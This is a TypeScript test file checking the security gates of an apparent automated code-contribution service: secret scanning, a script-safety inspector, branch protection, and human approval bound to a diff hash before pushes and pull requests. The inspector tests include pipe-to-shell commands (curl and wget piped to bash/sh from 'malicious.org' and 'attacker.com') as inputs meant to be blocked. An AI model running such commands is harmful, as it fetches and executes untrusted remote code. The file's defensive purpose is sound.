import { describe, it, expect, beforeEach, afterAll } from "vitest";
import { ContributionWorkbenchService } from "@/modules/workbench/service";
import { scanPatchForSecrets, inspectScriptsForSafety, executeSandboxCommand } from "@/modules/workbench/sandbox";
import { MockGitHubAdapter } from "@/integrations/github";
import { prisma } from "@/lib/db";
import { computeHash } from "@/lib/crypto";

describe("Contribution Workbench: Security Gates & Policy Enforcement", () => {
  let service: ContributionWorkbenchService;
  let mockAdapter: MockGitHubAdapter;

  beforeEach(() => {
    mockAdapter = new MockGitHubAdapter();
    service = new ContributionWorkbenchService(mockAdapter);
  });

  afterAll(async () => {
    await prisma.$disconnect();
  });

  // 1. Secret Scanning Tests
  describe("Secret Scanning Guard", () => {
    it("should allow clean patches with zero secrets", () => {
      const cleanDiff = `diff --git a/benchmarks/inference.py b/benchmarks/inference.py
+def benchmark(model): pass`;
      const result = scanPatchForSecrets(cleanDiff);
      expect(result.hasSecrets).toBe(false);
      expect(result.detectedPatterns).toHaveLength(0);
    });

    it("should detect and reject patch containing a private RSA key", () => {
      const maliciousDiff = `diff --git a/key.pem b/key.pem
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEA0m...
+-----END RSA PRIVATE KEY-----`;
      const result = scanPatchForSecrets(maliciousDiff);
      expect(result.hasSecrets).toBe(true);
      expect(result.detectedPatterns).toContain("Private RSA/EC Key");
    });

    it("should detect and reject patch containing a GitHub personal access token", () => {
      const tokenDiff = `diff --git a/config.py b/config.py
+GITHUB_TOKEN = "ghp_1234567890abcdefghijklmnopqrstuvwxyz1234"`;
      const result = scanPatchForSecrets(tokenDiff);
      expect(result.hasSecrets).toBe(true);
      expect(result.detectedPatterns).toContain("GitHub Personal Access Token");
    });
  });

  // 2. Untrusted Script & Setup Command Inspection
  describe("Script Safety Inspector", () => {
    it("should approve standard testing and linting commands", () => {
      const safeCommand = "pytest tests/test_benchmark.py -v";
      const result = inspectScriptsForSafety(safeCommand);
      expect(result.isSafe).toBe(true);
      expect(result.flaggedCommands).toHaveLength(0);
    });

    it("should block dangerous pipe from curl to shell", () => {
      const dangerousCommand = "curl -sSL https://malicious.org/install.sh | bash";
      const result = inspectScriptsForSafety(dangerousCommand);
      expect(result.isSafe).toBe(false);
      expect(result.reasons[0]).toContain("Dangerous pipe from curl to shell");
    });

    it("should block sudo privilege elevation in sandbox", () => {
      const sudoCommand = "sudo apt-get install -y evil-pkg";
      const result = inspectScriptsForSafety(sudoCommand);
      expect(result.isSafe).toBe(false);
      expect(result.reasons[0]).toContain("Elevation of privilege (sudo) forbidden");
    });

    it("should fail sandbox command safely when blocked by safety inspector", async () => {
      const result = await executeSandboxCommand("wget http://attacker.com/script | sh", "scratch/sandbox");
      expect(result.isSuccess).toBe(false);
      expect(result.exitCode).toBe(126);
      expect(result.stderr).toContain("Security Exception");
    });
  });

  // 3. Pre-Coding Inspection & Policy Checks
  describe("Pre-Coding Inspection & Upstream Protection", () => {
    it("should verify repository license and guidelines before coding", async () => {
      const inspection = await service.inspectRepository("badrisatyam1-ctrl/wafer-defect-classification", 3);
      expect(inspection.isWelcome).toBe(true);
      expect(inspection.isLicenseClear).toBe(true);
      expect(inspection.hasContributingGuide).toBe(true);
      expect(inspection.duplicatePrDetected).toBe(false);
    });

    it("should reject patch application directly on upstream main branch", () => {
      const patch = "diff --git a/file.py ...";
      const result = service.preparePatch(patch, "main"); // Attempting to edit main directly
      expect(result.isValid).toBe(false);
      expect(result.error).toContain("upstream default branch");
    });
  });

  // 4. Remote Write Approval Gate Enforcement
  describe("Remote Write Approval Gates (§6)", () => {
    it("should block remote push when approval does not exist", async () => {
      const unapprovedDiffHash = computeHash("unapproved-diff");
      const pushResult = await service.executeApprovedPush("non-existent-approval-id", unapprovedDiffHash);
      expect(pushResult.success).toBe(false);
      expect(pushResult.error).toContain("not found");
    });

    it("should invalidate approval if diff hash was modified after approval was issued", async () => {
      const userId = "demo-user-badri";
      const originalDiff = "diff --git a/a.py b/a.py\n+print('original')";
      const originalHash = computeHash(originalDiff);

      // Create approval with original diff hash
      const approvalId = await service.requestPushApproval(
        userId,
        "task-test-1",
        "badrisatyam1-ctrl/wafer-defect-classification",
        originalHash
      );

      // Attempt to push with altered diff hash
      const tamperedDiff = "diff --git a/a.py b/a.py\n+print('tampered')";
      const tamperedHash = computeHash(tamperedDiff);

      const pushResult = await service.executeApprovedPush(approvalId, tamperedHash);
      expect(pushResult.success).toBe(false);
      expect(pushResult.error).toContain("mismatch");
    });

    it("should execute approved push when diff hash matches approval record", async () => {
      const userId = "demo-user-badri";
      const diffContent = "diff --git a/benchmarks.py b/benchmarks.py\n+def run(): pass";
      const diffHash = computeHash(diffContent);

      const approvalId = await service.requestPushApproval(
        userId,
        "task-test-2",
        "badrisatyam1-ctrl/wafer-defect-classification",
        diffHash
      );

      const pushResult = await service.executeApprovedPush(approvalId, diffHash);
      expect(pushResult.success).toBe(true);

      // Verify audit event was recorded
      const audit = await prisma.auditEvent.findFirst({
        where: { actionName: "REMOTE_PUSH_EXECUTED" },
        orderBy: { timestamp: "desc" },
      });
      expect(audit).toBeDefined();
    });

    it("should require a second explicit approval before opening a pull request", async () => {
      const userId = "demo-user-badri";
      const diffContent = "diff --git a/benchmarks.py b/benchmarks.py\n+def run(): pass";
      const diffHash = computeHash(diffContent);

      const prApprovalId = await service.requestPrApproval(
        userId,
        "task-test-3",
        "badrisatyam1-ctrl/wafer-defect-classification",
        "feat: add batch inference benchmark",
        diffHash
      );

      const prResult = await service.executeApprovedOpenPr(
        prApprovalId,
        "badrisatyam1-ctrl/wafer-defect-classification",
        "feat: add batch inference benchmark",
        "Fixes #3 with benchmark module.",
        diffHash
      );

      expect(prResult.success).toBe(true);
      expect(prResult.prUrl).toContain("pull/4");
      expect(prResult.prNumber).toBe(4);
    });
  });
});
